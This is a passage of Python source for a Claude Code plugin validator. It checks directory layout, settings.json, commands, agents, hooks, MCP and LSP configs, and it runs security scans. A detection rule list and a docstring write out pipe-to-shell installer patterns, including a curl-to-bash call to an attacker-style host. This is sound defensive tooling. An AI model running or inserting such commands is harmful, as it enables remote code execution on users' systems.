    validate_dependencies(manifest, report, hosting_marketplace=effective_hosting)
    validate_user_config_structure(manifest, report)
    validate_channels_structure(manifest, plugin_root, report)
    validate_monitors_entries(manifest, plugin_root, report)

    return cast(dict[str, Any], manifest)


def validate_structure(plugin_root: Path, report: ValidationReport, marketplace_only: bool = False) -> None:
    """Validate plugin directory structure.

    Args:
        plugin_root: Path to the plugin directory
        report: ValidationReport to add results to
        marketplace_only: If True, .claude-plugin directory is optional
    """
    claude_plugin_dir = plugin_root / ".claude-plugin"
    if not claude_plugin_dir.is_dir():
        if marketplace_only:
            msg = ".claude-plugin absent (marketplace-only, uses marketplace.json)"
            report.passed(msg)
        else:
            report.critical(".claude-plugin directory not found")
            return
    else:
        report.passed(".claude-plugin directory exists")

    # Components must be at root, NOT in .claude-plugin
    for component in ["commands", "agents", "skills", "hooks", "scripts", "schemas", "bin"]:
        wrong_path = plugin_root / ".claude-plugin" / component
        if wrong_path.exists():
            report.critical(f"{component}/ must be at plugin root, not in .claude-plugin/")

    # Common directories
    common_dirs = {
        "commands": "INFO",
        "agents": "INFO",
        "skills": "INFO",
        "hooks": "INFO",
        "scripts": "INFO",
        "docs": "INFO",
        "output-styles": "INFO",
        "bin": "INFO",  # plugins.md L192 — contents added to Bash PATH while plugin enabled
        "monitors": "INFO",  # plugins-reference.md — background monitor definitions
    }

    for d, level in common_dirs.items():
        if (plugin_root / d).is_dir():
            report.passed(f"{d}/ directory exists")
        else:
            if level == "INFO":
                report.info(f"Optional directory {d}/ not found")
            else:
                report.minor(f"Directory {d}/ not found")

    # Check for non-standard directories — warn but don't block, since users
    # may add folders like libs/, modules/, resources/ needed by scripts.
    # Also dynamically discover folders referenced from manifest fields
    # (.mcp.json, .lsp.json, hooks, monitors, plugin.json mcpServers/lspServers
    # commands+args) so e.g. `mcp-server/` referenced via
    # `${CLAUDE_PLUGIN_ROOT}/mcp-server/index.js` doesn't false-positive.
    known_dirs = {
        ".claude-plugin",
        ".git",
        ".jj",  # Jujutsu VCS metadata (v2.1.86)
        ".sl",  # Sapling VCS metadata (v2.1.86)
        ".github",
        "commands",
        "agents",
        "skills",
        "hooks",
        "scripts",
        "docs",
        "rules",
        "schemas",
        "bin",  # plugins.md L192 — executables on PATH while plugin enabled
        "monitors",  # plugins-reference.md — background monitor definitions (v2.1.105+)
        "servers",  # MCP server bundles per docs example: ${CLAUDE_PLUGIN_ROOT}/servers/db-server
        "templates",
        "tests",
        "test",  # singular variant
        # Common non-standard but legitimate dirs
        "lib",
        "libs",
        "modules",
        "resources",
        "assets",
        "data",
        "config",
        "configs",
        "examples",
        "samples",
        "references",
        # Developer tooling dirs
        "git-hooks",
        "fixtures",
        "vendor",
        "src",
        "dist",
        "build",
        "out",
        "target",
        "output-styles",
        "design",  # TRDD design docs (design/tasks/)
        "reports",  # v2.24.0 — mandated report output folder (gitignored; see cpv_validation_common.resolve_reports_dir())
        "reviews",  # code-review output folder (recognised built-in; TRDD-02e1672b)
        "workflows",  # Workflow-DSL scripts (Claude Code 2.1.154+ Workflow tool / ultracode); #94. Files inside are still security-scanned — this only stops the structural RC-NONSTD-DIR-001 MAJOR.
        # Common dirs across many plugins (added v2.23.2 after empirical scan
        # of 160 installed plugins surfaced these as repeat false positives):
        "prompts",  # prompt templates (used by codex and most AI plugins)
        "demo",
        "demos",
        "eval",
        "evals",  # evaluation scripts (visualize, clean-viz)
        "node_modules",  # JavaScript dependencies — never publish, but common in dev caches
        "output",
        "outputs",
        "server",  # backend code (cc-plugin-viz, web-automation-suite)
        "public",  # public web assets (cc-plugin-viz)
        "static",  # static web assets
        "web",  # web frontend
        "shared",  # shared utilities
        "settings",  # plugin-managed settings (claude-code-settings)
        "guidances",  # AI guidance docs (claude-code-settings)
        "plugins",  # nested plugin defs (claude-code-settings)
        # Language source directories (plugins that ship native binaries often
        # bundle source for the platform-specific binaries in bin/):
        "rust",  # Rust source (perfect-skill-suggester, etc.)
        "go",  # Go source
        "python",  # Python source (less common when scripts/ exists, but seen)
        "node",  # Node.js source
        "ts",  # TypeScript source
        "js",  # JavaScript source
        "java",
        "kotlin",
        "swift",
        "ruby",
        "csharp",
        "cpp",
        "c",
    }
    referenced_dirs = _collect_manifest_referenced_dirs(plugin_root)

    # Submodule pattern: many plugins (especially Layout B nested ones) have a
    # subdirectory named after the plugin itself (e.g., `web-automation-suite/`
    # contains `web-automation-suite/`). Auto-allow this pattern. Read the plugin
    # name from .claude-plugin/plugin.json once.
    plugin_name_lower: str | None = None
    plugin_json_path = plugin_root / ".claude-plugin" / "plugin.json"
    if plugin_json_path.exists():
        try:
            pj = json.loads(plugin_json_path.read_text(encoding="utf-8"))
            if isinstance(pj, dict):
                pn = pj.get("name")
                if isinstance(pn, str):
                    plugin_name_lower = pn.lower()
        except (json.JSONDecodeError, OSError):
            pass

    # SECURITY (TRDD-02e1672b): CPV no longer honors a plugin-declared
    # `cpv.allow_root_dirs` allow-list — a plugin must not be able to exempt
    # its own directories from CPV's checks. Legitimate non-standard
    # directories are recognised by the built-in `known_dirs` set above (CPV's
    # own logic), by manifest references, by .gitignore, or by the
    # vendoring/submodule heuristics. The removed-key deprecation WARNING is
    # emitted once in validate_manifest (consolidated for all cpv.* opt-outs).
    # The .gitignore patterns are plugin-wide, so parse them once here (O(1)
    # instead of once per candidate directory). The gitignore helpers are
    # imported once rather than inside the loop body.
    gitignore_patterns: list[Any] | None = None
    try:
        from cpv_validation_common import (
            is_path_gitignored,  # noqa: PLC0415
            parse_gitignore,  # noqa: PLC0415
        )

        gitignore_path = plugin_root / ".gitignore"
        if gitignore_path.is_file():
            gitignore_patterns = parse_gitignore(gitignore_path)
    except (ImportError, OSError, ValueError):
        is_path_gitignored = None  # type: ignore[assignment]
        gitignore_patterns = None

    # Also skip hidden dirs and _dev dirs
    for item in plugin_root.iterdir():
        if not item.is_dir():
            continue
        dirname = item.name
        if dirname.startswith(".") or dirname.endswith("_dev"):
            continue
        dirname_lower = dirname.lower()
        if dirname_lower in known_dirs:
            continue
        if dirname_lower in referenced_dirs:
            # Folder is legitimately used by the plugin's manifest (MCP, LSP, hooks,
            # or monitor commands reference `${CLAUDE_PLUGIN_ROOT}/<dirname>/...`).
            # No warning needed — its purpose is self-documented by the manifest.
            continue
        if plugin_name_lower and dirname_lower == plugin_name_lower:
            # Submodule pattern: subdirectory named after the plugin itself.
            # Common in Layout B nested marketplaces and dev-cached plugins.
            continue
        # Issue #16 category H: skip vendoring-conventional roots
        # (external/, vendor/, third_party/, node_modules/, etc.) AND any
        # directory listed as a submodule in .gitmodules.
        if is_vendored_path(Path(dirname), plugin_root):
            continue
        # Issue #37 — directories the plugin explicitly excludes from
        # distribution via .gitignore are not part of "what the plugin
        # ships" and therefore can't cause an empty install. Common
        # patterns: research material (INPUT_DEV/, _research/), training
        # fixtures (samples/, fixtures/), local builds (build/, dist/)
        # that the publish pipeline doesn't include in the tarball. The
        # .gitignore was parsed ONCE above the loop; just consult it here.
        if gitignore_patterns is not None and is_path_gitignored is not None:
            try:
                if is_path_gitignored(dirname, gitignore_patterns) or is_path_gitignored(
                    dirname + "/", gitignore_patterns
                ):
                    continue
            except (OSError, ValueError):
                pass
        # Severity: MAJOR (was WARNING). The user's directive: "NO DEVIATION
        # FROM THE STANDARD can be allowed unless you declare the custom
        # folder in plugin.json". An undeclared non-standard root folder
        # is the #1 source of "the plugin published but installs to
        # nothing" because the install pipeline only knows about the
        # standard component directories.
        report.major(
            f"[RC-NONSTD-DIR-001] Non-standard directory '{dirname}/' — not part "
            "of the plugin spec and not recognised by CPV. Move its contents "
            "under a standard component dir (skills/agents/commands/hooks/"
            "scripts/...), gitignore it if it is dev-only and not shipped, or "
            "reference it from the manifest if a component genuinely uses it. "
            "Non-standard root dirs are the #1 cause of empty plugin installs "
            "because the install pipeline only loads from the standard "
            "directories."
        )

    # Validate plugin-shipped settings.json if present
    settings_path = plugin_root / "settings.json"
    if settings_path.exists():
        try:
            settings_data = json.loads(settings_path.read_text(encoding="utf-8"))
            if not isinstance(settings_data, dict):
                report.major("settings.json: root must be a JSON object", "settings.json")
            else:
                # "agent" is the primary plugin-level setting; "extraKnownMarketplaces"
                # is the v2.1.80 inline-marketplace declaration validated separately below.
                # "subagentStatusLine" is the v2.1.x plugin-scoped override (plugins.md:278-288).
                # TRDD-e2b17a61: "strictKnownMarketplaces" added so it does not emit a
                # spurious "unrecognized key" MINOR — its actual scope violation
                # (admin-managed only) is reported as a MAJOR below.
                recognized_keys = {
                    "agent",
                    "extraKnownMarketplaces",
                    "strictKnownMarketplaces",
                    "subagentStatusLine",
                }
                has_unrecognized = False
                for key in settings_data:
                    if key not in recognized_keys:
                        has_unrecognized = True
                        report.minor(
                            f"settings.json: unrecognized key '{key}' — supported plugin settings: {', '.join(sorted(recognized_keys))}",
                            "settings.json",
                        )
                # Validate 'agent' value references a real agent file
                if "agent" in settings_data:
                    agent_val = settings_data["agent"]
                    if isinstance(agent_val, str) and agent_val:
                        agents_dir = plugin_root / "agents"
                        agent_file = agents_dir / f"{agent_val}.md"
                        if agents_dir.is_dir() and not agent_file.is_file():
                            report.minor(
                                f"settings.json 'agent' value '{agent_val}' does not match any agent file in agents/",
                                "settings.json",
                            )
                    elif not isinstance(agent_val, str):
                        report.major(
                            f"settings.json 'agent' must be a string, got {type(agent_val).__name__}", "settings.json"
                        )
                # TRDD-e2b17a61 — v2.1.80+: validate extraKnownMarketplaces /
                # strictKnownMarketplaces by delegating to the dedicated
                # settings-marketplace validator. Wiring fires for EITHER block so
                # authors get schema validation for whichever they ship. Results
                # merge into this plugin report so all findings land in a single
                # report.
                #
                # Open question 3 (TRDD-e2b17a61): both keys are scope-mismatched
                # when they live in a plugin-shipped settings.json:
                #   - extraKnownMarketplaces: USER/PROJECT-scope (silently ignored
                #     from plugins) → emit WARNING so the author knows the
                #     declaration is a no-op for end users.
                #   - strictKnownMarketplaces: ADMIN-MANAGED-only allowlist → emit
                #     MAJOR because the author may be relying on lockdown that
                #     will never fire.
                has_extra_kn_mp = "extraKnownMarketplaces" in settings_data
                has_strict_kn_mp = "strictKnownMarketplaces" in settings_data
                if has_extra_kn_mp or has_strict_kn_mp:
                    from validate_settings_marketplace import validate_settings_marketplace_file

                    sm_report = validate_settings_marketplace_file(settings_path)
                    report.merge(sm_report)

                    if has_extra_kn_mp:
                        report.warning(
                            "settings.json: 'extraKnownMarketplaces' is a USER/PROJECT-scope "
                            "key (settings.md). When shipped inside a plugin-shipped "
                            "settings.json it is silently ignored at runtime — Claude Code "
                            "only honours this block from user (~/.claude/settings.json) "
                            "or project (.claude/settings.json) scopes. Move the "
                            "declaration to your project README as installation guidance "
                            "instead of bundling it in the plugin.",
                            "settings.json",
                        )
                    if has_strict_kn_mp:
                        report.major(
                            "settings.json: 'strictKnownMarketplaces' is an "
                            "ADMIN-MANAGED-only key (cc_scope_rules.MANAGED_ONLY_KEYS, "
                            "managed-settings.md). Claude Code silently ignores this "
                            "block from any plugin-shipped settings.json — the author "
                            "is relying on lockdown enforcement that will NEVER fire. "
                            "Strict allowlists belong in /etc/claude-code/managed-settings.json "
                            "(Linux), /Library/Application Support/ClaudeCode/managed-settings.json "
                            "(macOS), or C:\\ProgramData\\ClaudeCode\\managed-settings.json (Windows).",
                            "settings.json",
                        )
                if not has_unrecognized:
                    report.passed("settings.json is valid", "settings.json")
                else:
                    report.passed("settings.json is parseable JSON", "settings.json")
        except json.JSONDecodeError as e:
            report.major(f"settings.json: JSON parse error: {e}", "settings.json")

    # Check that plugin has at least some actual content beyond just a manifest
    content_indicators = ["commands", "skills", "agents", "hooks", "scripts", "output-styles"]
    # CC v2.1.142: a root-level SKILL.md (with no skills/ subdir) is surfaced
    # as a skill, so it counts as plugin content on its own.
    file_indicators = [".mcp.json", ".lsp.json", "SKILL.md"]
    has_content = any((plugin_root / d).is_dir() for d in content_indicators) or any(
        (plugin_root / f).exists() for f in file_indicators
    )
    if not has_content:
        report.major(
            "Plugin has a manifest but no content — expected at least one of: "
            "commands/, skills/, agents/, hooks/, scripts/, .mcp.json, .lsp.json, "
            "or a root-level SKILL.md",
            ".claude-plugin/plugin.json",
        )

    # Check pyproject.toml for Python plugins
    has_py_scripts = (plugin_root / "scripts").is_dir() and any((plugin_root / "scripts").glob("*.py"))
    if has_py_scripts:
        if (plugin_root / "pyproject.toml").exists():
            report.passed("pyproject.toml exists")
        else:
            report.minor("pyproject.toml not found — recommended for Python plugins")
        if (plugin_root / ".python-version").exists():
            report.passed(".python-version exists")
        else:
            report.warning(".python-version not found — recommended for reproducible builds")


def check_tracked_gitignored_files(plugin_root: Path, report: ValidationReport) -> None:
    """Enforce .gitignore: a git-tracked file that ALSO matches .gitignore is INVALID.

    `.gitignore` declares a path "not part of the repo," but tracking it ships it
    anyway (`.gitignore` does not untrack an already-tracked file). The result is
    an ambiguous shipped-but-ignored artifact AND a scan-evasion vector — an
    author could `git add` a payload then `.gitignore` it to hide it from the
    scanners. The skillaudit scanner now scans such files regardless; this rule
    additionally FAILS the plugin so the anti-pattern is removed, not merely
    scanned around. gitignore enforcement is non-negotiable.

    Emits ONE MAJOR finding (blocking → plugin INVALID) listing the offending
    files (capped, for readability) and directing the user to the fix agent,
    which untracks them automatically (`git rm --cached`, keeping the working-tree
    copy). No-ops when git is unavailable / not a repo (tracked-ness is then
    undeterminable) or when nothing is tracked+gitignored.
    """
    tracked_ignored = tracked_but_gitignored_paths(plugin_root)
    if not tracked_ignored:  # None (no git) or empty list (clean)
        return
    shown = tracked_ignored[:15]
    more = len(tracked_ignored) - len(shown)
    listing = ", ".join(shown) + (f", … (+{more} more)" if more > 0 else "")
    report.major(
        f"{len(tracked_ignored)} git-tracked file(s) also match .gitignore — "
        "gitignore is not enforced. A tracked+gitignored file still ships "
        "(.gitignore does not untrack it), creating a shipped-but-ignored artifact "
        "and a scan-evasion vector, so the plugin is INVALID. Untrack them with the "
        "fix agent (/cpv-fix-validation — it runs `git rm --cached <file>` to "
        "untrack while keeping the working-tree file), or remove them from "
        f".gitignore if they must ship. Files: {listing}",
        ".gitignore",
    )


def validate_commands(plugin_root: Path, report: ValidationReport) -> None:
    """Validate command definitions."""
    commands_dir = plugin_root / "commands"

    if not commands_dir.is_dir():
        report.info("No commands/ directory found")
        return

    # Find all command files
    cmd_files = list(commands_dir.glob("*.md"))
    if not cmd_files:
        report.info("No command files (*.md) found in commands/")
        return

    report.info(f"Found {len(cmd_files)} command file(s)")

    for cmd_path in cmd_files:
        validate_command_file(cmd_path, report)


def validate_command_file(cmd_path: Path, report: ValidationReport) -> None:
    """Validate a single command file by delegating to the comprehensive validator.

    `validate_command` (validate_command.py) is the single source of truth: it
    owns the frontmatter, name==filename, and description checks (plus the wider
    command suite) that used to be duplicated inline here. No TOC embedding check
    applies to commands.
    """
    rel_path = f"commands/{cmd_path.name}"
    for result in validate_command_full(cmd_path).results:
        report.add(result.level, result.message, rel_path, result.line)


def validate_agents(plugin_root: Path, report: ValidationReport) -> None:
    """Validate agent definitions."""
    agents_dir = plugin_root / "agents"

    if not agents_dir.is_dir():
        report.info("No agents/ directory found")
        return

    # Find all agent files
    agent_files = list(agents_dir.glob("*.md"))
    if not agent_files:
        report.info("No agent files (*.md) found in agents/")
        return

    report.info(f"Found {len(agent_files)} agent file(s)")

    for agent_path in agent_files:
        validate_agent_file(agent_path, report)


def validate_agent_file(agent_path: Path, report: ValidationReport) -> None:
    """Validate a single agent file by delegating to the comprehensive validator.

    `validate_agent` (validate_agent.py) is the single source of truth: it
    auto-detects plugin-shipped context via is_plugin_shipped_agent() and runs
    the forbidden/allowed-field restriction checks, frontmatter/name/description
    checks, and the agent security suite. The previously-inline frontmatter,
    name, and plugin-shipped-restriction checks here were thin duplicates and
    are now removed.
    """
    rel_path = f"agents/{agent_path.name}"
    for result in validate_agent_full(agent_path).results:
        report.add(result.level, result.message, rel_path, result.line)

    # validate_agent does NOT do the orchestrator's cross-file TOC-embedding
    # check (agent files must embed TOCs from referenced .md files), so re-add it.
    content = agent_path.read_text(encoding="utf-8", errors="replace")
    validate_toc_embedding(content, agent_path, agent_path.parent, report)


def validate_hooks(plugin_root: Path, report: ValidationReport) -> None:
    """Validate hook configuration using comprehensive hook validator."""
    hooks_dir = plugin_root / "hooks"

    if not hooks_dir.is_dir():
        report.info("No hooks/ directory found")
        return

    hooks_json = hooks_dir / "hooks.json"
    if not hooks_json.exists():
        report.info("No hooks.json found")
        return

    # Use comprehensive hook validator
    hook_report = validate_hook_file(hooks_json, plugin_root)

    # Transfer all results to main report
    for result in hook_report.results:
        file_path = result.file
        if file_path:
            if file_path.startswith(str(plugin_root)):
                file_path = file_path[len(str(plugin_root)) + 1 :]
            if not file_path.startswith("hooks/"):
                file_path = f"hooks/{file_path}"
        else:
            file_path = "hooks/hooks.json"

        report.add(result.level, result.message, file_path, result.line)


def validate_mcp(plugin_root: Path, report: ValidationReport) -> None:
    """Validate MCP server configurations."""
    # Use comprehensive MCP validator
    mcp_report = validate_plugin_mcp(plugin_root)

    # Transfer all results to main report
    for result in mcp_report.results:
        report.add(result.level, result.message, result.file, result.line)


def validate_lsp(plugin_root: Path, report: ValidationReport) -> None:
    """Validate all LSP configurations — delegates to validate_plugin_lsp().

    Single source of truth (TRDD-021250b5 Phase 3): covers plugin.json:lspServers
    AND the external .lsp.json / lsp.json / lsp-config.json / .vscode/settings.json
    files, cross-source name collisions, and the full per-field type/severity
    checks the old inline block (removed from validate_manifest) never did.
    """
    lsp_report = validate_plugin_lsp(plugin_root)
    for result in lsp_report.results:
        report.add(result.level, result.message, result.file, result.line)


def validate_hook_precedence_all(plugin_root: Path, report: ValidationReport) -> None:
    """Validate cross-hook precedence conflicts for all hooks.json files."""
    hooks_dir = plugin_root / "hooks"
    if not hooks_dir.is_dir():
        return  # No hooks/ dir — nothing to check; validate_hooks already covers this
    hooks_json = hooks_dir / "hooks.json"
    if not hooks_json.exists():
        return  # No hooks.json — nothing to check
    prec_report = validate_hook_precedence_file(hooks_json)
    for result in prec_report.results:
        file_path = result.file or "hooks/hooks.json"
        if file_path and file_path.startswith(str(plugin_root)):
            file_path = file_path[len(str(plugin_root)) + 1 :]
        report.add(result.level, result.message, file_path, result.line)


def validate_encoding(plugin_root: Path, report: ValidationReport) -> None:
    """Validate file encodings — delegates to validate_encoding (validate_encoding.py).

    Confirmed coverage gap (TRDD-021250b5 Phase 3): the whole-plugin path never
    ran the encoding validator. Catches non-UTF-8 files, BOM markers, CRLF/mixed
    line endings, and invisible/control characters across the plugin tree.
    """
    enc_report = validate_encoding_full(plugin_root)
    for result in enc_report.results:
        report.add(result.level, result.message, result.file, result.line)


# TRDD-e3e74f69 telemetry hookup
def _run_skillaudit_native(plugin_root: Path, report: ValidationReport) -> None:
    """Run the MANDATORY native skillaudit scan (v2.99.1 hookup).

    The scanner runs in-process — zero subprocess, zero network, zero
    third-party deps. Findings are mapped into the standard
    ValidationReport severity model (critical/major/minor/nit/info)
    with the threat category embedded in the message so reviewers see
    the threat domain at a glance: ``[skillaudit:<category> <rule_id>]``.

    Iron rule: missing rule catalog → CRITICAL (never silently skipped).
    No env-var bypass is honored.

    The CPV self-scan-skip filter is applied so that when CPV scans
    ITSELF, its own pattern-source files (validate_security.py,
    fix-validation references, security test fixtures, rule catalogs)
    don't surface their pattern STRINGS as findings — those are what
    we LOOK FOR, not what's actively malicious. Hash-anchored: only
    CPV files whose SHA256 matches the canonical manifest get skipped;
    a malicious plugin that renames a payload to ``validate_xss.py``
    cannot evade scanning.
    """
    from cpv_skillaudit_native import (  # noqa: PLC0415
        report_findings as skillaudit_report_findings,
    )
    from cpv_skillaudit_native import (  # noqa: PLC0415
        run_skillaudit_scan,
    )

    result = run_skillaudit_scan(plugin_root)

    # Apply the same self-scan filter chain validate_security.py uses
    # when running its Check 27. Best-effort import — if validate_security
    # is unavailable for any reason, fall through with no filter (the
    # scanner is still mandatory; just slightly noisier on CPV self-scan).
    try:
        from validate_security import (  # noqa: PLC0415
            _is_always_skip_basename,
            _is_dev_scratch_path,
            _is_test_file_path,
            _is_vendored_dep_path,
            _set_cpv_self_scan,
            cpv_self_scan_skip,
            cpv_self_scan_skip_line,
            is_cpv_self_scan,
            is_fp_corpus_markdown,
        )
    except ImportError:
        skillaudit_report_findings(result, plugin_root, report, should_skip=None)
        return

    # ARM the self-scan filter — without this, cpv_self_scan_skip()
    # returns False unconditionally and the filter chain below is a
    # no-op. validate_security.py::main does this for its own
    # Check 27; validate_plugin must do the same when invoking
    # skillaudit directly.
    #
    # The arm/scan/report sequence is wrapped in try/finally that DISARMS
    # the self-scan flag afterwards. The flag lives in module-global state
    # inside validate_security; validate_plugin's functions are invoked
    # in-process (test suite, batch orchestrator, any caller that validates
    # several plugins in sequence). Without the finally-disarm, the flag set
    # while scanning a CPV-self target would stay armed and a SUBSEQUENT
    # external plugin's scan could read plugin A's stale self-scan state and
    # wrongly suppress its findings. Disarming to the module default
    # (inactive) after each run keeps the global consistent with the one-shot
    # CLI contract.
    self_scan = is_cpv_self_scan(plugin_root)
    try:
        _set_cpv_self_scan(self_scan, plugin_root=plugin_root, notice_report=None)

        # When scanning CPV itself, gitignored files are dev artifacts
        # (rechecker notifications at the repo root, scratch tmp files,
        # design notes, etc.) — they should not surface as findings. Use
        # validate_plugin's GitignoreFilter to identify and skip them.
        # When scanning an EXTERNAL plugin we deliberately do NOT skip
        # gitignored content: a malicious plugin might gitignore its
        # payload to evade casual review.
        from typing import Callable as _Callable  # noqa: PLC0415

        gitignore_check: _Callable[[str], bool] | None = None
        if self_scan and _gi is not None:

            def _is_gitignored(rel_path: str) -> bool:
                try:
                    rel = Path(rel_path)
                    if not rel.is_absolute():
                        rel = plugin_root / rel
                    return _gi.is_ignored(rel)  # type: ignore[union-attr]
                except (OSError, ValueError):
                    return False

            gitignore_check = _is_gitignored

        def _should_skip(file_path: str, line: int | None) -> bool:
            if not file_path:
                return False
            if _is_always_skip_basename(file_path):
                return True
            if cpv_self_scan_skip(file_path):
                return True
            if _is_vendored_dep_path(file_path):
                return True
            if _is_dev_scratch_path(file_path):
                return True
            if _is_test_file_path(file_path):
                return True
            # v2.99.1 — gitignored content during self-scan only.
            if gitignore_check is not None and gitignore_check(file_path):
                return True
            if isinstance(line, int) and line > 0:
                try:
                    fpath = Path(file_path)
                    if not fpath.is_absolute():
                        fpath = plugin_root / fpath
                    if fpath.is_file() and fpath.stat().st_size < 2_000_000:
                        # errors="replace" (not "ignore"): the body is consumed
                        # by line-anchored matchers (cpv_self_scan_skip_line uses
                        # the reported line number). "ignore" DROPS undecodable
                        # bytes, which can shift content off its real line;
                        # "replace" substitutes U+FFFD and preserves line/offset
                        # alignment so the line lookup stays accurate.
                        body = fpath.read_text(encoding="utf-8", errors="replace")
                        if cpv_self_scan_skip_line(file_path, body, int(line)):
                            return True
                        if is_fp_corpus_markdown(file_path, body):
                            return True
                except OSError:
                    pass
            return False

        skillaudit_report_findings(result, plugin_root, report, should_skip=_should_skip)
    finally:
        # Restore the module default (inactive) so the armed flag never leaks
        # into a subsequent in-process scan of a different plugin.
        _set_cpv_self_scan(False)


# Execution-class RC rule IDs that are genuinely RCE/exec-shaped but are NOT
# (yet) registered in cpv_validation_common._SECURITY_GATE_BUCKETS Bucket A.
# These are the supply-chain pipe-to-shell installers (RC-136..RC-143, RC-26),
# the obfuscated decode-then-exec proximity rule (RC-70), and the taint
# source→sink sanitizer-bypass marker (RC-75 — the RC-73/74 siblings already
# carry Bucket A). The plugin gate's execution-class pass below treats a
# finding as execution-class iff its rule_id resolves to Bucket A in the
# canonical map OR appears in this explicit set, so an os.system("curl … |
# bash") (RC-136 CRITICAL) blocks the plugin gate exactly as it blocks the
# standalone `security` subcommand. FN-safe — this only ADDS coverage; it
# mutes nothing and relaxes no gate. (RT4-plugin-gate-weaker-than-security.)
_EXECCLASS_RCE_RULE_IDS: frozenset[str] = frozenset(
    {
        "RC-26",  # curl > file ; sh file (redirect/separator-then-execute)
        "RC-70",  # obfuscated decode-then-exec within ±3 lines of an exec sink
        "RC-75",  # taint chain reaches an exec sink past a (bypassed) sanitizer
        "RC-136",  # curl … | sh/bash/zsh/ksh — pipe-to-shell installer (RCE)
        "RC-137",  # wget … | sh/bash/zsh/ksh — same RCE class with wget
        "RC-138",  # curl … | python/node in exec mode (stdin/-c/-e/-m pip)
        "RC-139",  # wget … | python/node in exec mode
        "RC-140",  # pip install from a non-PyPI URL/git+/index-url (unsigned)
        "RC-141",  # npm install from a non-npm-registry source (unsigned)
        "RC-142",  # curl -o … && chmod/sh/bash/python/node (download-then-exec)
        "RC-143",  # wget -O … && chmod/sh/bash/python/node (download-then-exec)
    }
)


def _run_security_execclass_gate(plugin_root: Path, report: ValidationReport) -> None:
    """Run the in-process EXECUTION-CLASS security pass in plugin mode.

    Closes RT4-plugin-gate-weaker-than-security: the user-facing plugin gate
    (this script — the host of the Gate-A "Devitalize" banner) previously ran
    ONLY ``_run_skillaudit_native`` as its security pass and did NOT run the
    ``validate_security`` RC-rule suite. The asymmetry let a plain
    ``os.system("curl https://attacker.io/x.sh | bash")`` pass the plugin gate
    VALID/exit-0 while the SAME input fires CRITICAL via the ``security``
    subcommand (RC-136). The plugin gate — the weaker of the two — is the one
    users actually run, so the RCE shipped clean.

    This bridges the gap for the EXECUTION class only. It runs the SAME
    in-process content scanners ``validate_security`` uses for its RCE/exec
    findings — ``scan_all_files`` (injection / supply-chain / exfil /
    sandbox-escape / credential-harvest), ``check_phase2e_extras`` (RC-70
    obfuscated decode-then-exec, RC-65 cloud-IMDS), and ``check_phase10_taint``
    (RC-73/74/75 Python taint source→sink) — into a FRESH isolated report, then
    merges back ONLY the findings whose rule_id is execution-class (Bucket A in
    the canonical ``_SECURITY_GATE_BUCKETS`` map, or in ``_EXECCLASS_RCE_RULE_IDS``).

    Scope discipline (why this is surgical, not a second full security run):
      * ZERO external scanners. cc-audit, trufflehog, semgrep, cisco, tirith are
        the expensive / network-touching scanners. Those run ONLY in the
        standalone ``security`` subcommand / publish pipeline — NOT here. So
        there is no double-running of any expensive scanner.
      * Execution-class FILTER. Although ``scan_all_files`` also runs the
        secret / user-path / prompt-injection scanners, their findings are
        Bucket B/C (or unbucketed) and are DROPPED by the merge filter. They
        never reach the umbrella report, so a clean plugin's verdict is
        unchanged and no secret/path false-positive can flip a previously-VALID
        clean plugin. Only genuinely execution-class findings are merged.
      * NO suppression, NO gate relaxation. This only ADDS detection coverage
        for the RCE class the plugin gate was blind to. It never mutes a rule,
        relaxes ``--strict``, or adds an allow-list.

    Self-scan parity: mirrors ``_run_skillaudit_native`` — arms the
    ``validate_security`` self-scan flag (so CPV scanning ITSELF skips its own
    SHA-verified pattern-source files) inside a try/finally that ALWAYS
    disarms, preventing the module-global flag from leaking into a subsequent
    in-process scan of a different plugin.

    Best-effort import: if ``validate_security`` cannot be imported, this is a
    silent no-op (the mandatory ``_run_skillaudit_native`` pass still ran). The
    standalone ``security`` subcommand remains the exhaustive authority.
    """
    try:
        from cpv_validation_common import (  # noqa: PLC0415
            _SECURITY_GATE_BUCKETS,
            _extract_rule_id,
        )
        from validate_security import (  # noqa: PLC0415
            _set_cpv_self_scan,
            check_phase2e_extras,
            check_phase10_taint,
            is_cpv_self_scan,
            scan_all_files,
        )
    except ImportError:
        return

    def _is_execclass(message: str) -> bool:
        rule_id = _extract_rule_id(message)
        if rule_id in _EXECCLASS_RCE_RULE_IDS:
            return True
        return "A" in _SECURITY_GATE_BUCKETS.get(rule_id, frozenset())

    exec_report = ValidationReport()

    # ARM the self-scan filter for the duration of this pass — without it the
    # scanners' cpv_self_scan_skip / cpv_self_scan_skip_line calls are no-ops
    # and CPV scanning ITSELF would surface its own pattern STRINGS (the things
    # it LOOKS FOR) as execution-class findings. Disarm in finally so the flag
    # never leaks into a later in-process scan of another plugin.
    self_scan = is_cpv_self_scan(plugin_root)
    try:
        _set_cpv_self_scan(self_scan, plugin_root=plugin_root, notice_report=None)
        # Checks 3-11 content scan (in-process; no subprocess, no network).
        # Returns a stats dict we don't need — the findings land in exec_report.
        scan_all_files(plugin_root, exec_report)
        # Phase 2e — RC-70 obfuscated decode-then-exec (+ RC-65 cloud IMDS).
        check_phase2e_extras(plugin_root, exec_report)
        # Phase 10 — RC-73/74/75 Python taint source→sink.
        check_phase10_taint(plugin_root, exec_report)
    except Exception as exc:  # noqa: BLE001
        # A crashed execution-class pass is indeterminate. Surface it as MAJOR
        # (blocking) rather than silently swallowing — a hidden crash here would
        # re-open the very FN-hole this function closes.
        report.major(
            f"Execution-class security pass crashed: {type(exc).__name__}: {exc}",
        )
        return
    finally:
        _set_cpv_self_scan(False)

    # Merge ONLY execution-class findings (Bucket A / RCE set) at the four
    # blocking levels. WARNING/INFO/PASSED are never execution-class verdict
    # drivers (they match _classify_security_buckets' own level gate). Dedupe
    # on the exact (level, message, file, line) tuple so re-running a scanner
    # the skillaudit-native pass already emitted does not double-count.
    existing = {(r.level, r.message, r.file, r.line) for r in report.results}
    for r in exec_report.results:
        if r.level not in ("CRITICAL", "MAJOR", "MINOR", "NIT"):
            continue
        if not _is_execclass(r.message):
            continue
        key = (r.level, r.message, r.file, r.line)
        if key in existing:
            continue
        existing.add(key)
        # Append the ValidationResult object directly (mirrors
        # _merge_file_scan_result) so category/suggestion survive the merge
        # losslessly — report.add() positionally would not carry them.
        report.results.append(r)


def validate_telemetry(plugin_root: Path, report: ValidationReport) -> None:
    """Run the OTEL telemetry supply-chain sub-validator.

    Delegates to ``validate_telemetry.scan_plugin_for_telemetry`` and merges
    findings into the umbrella report. Catches the OTEL hazards introduced
    by ``monitoring-usage.md``: ``otelHeadersHelper`` in plugin settings
    (CRITICAL — periodic arbitrary code execution),
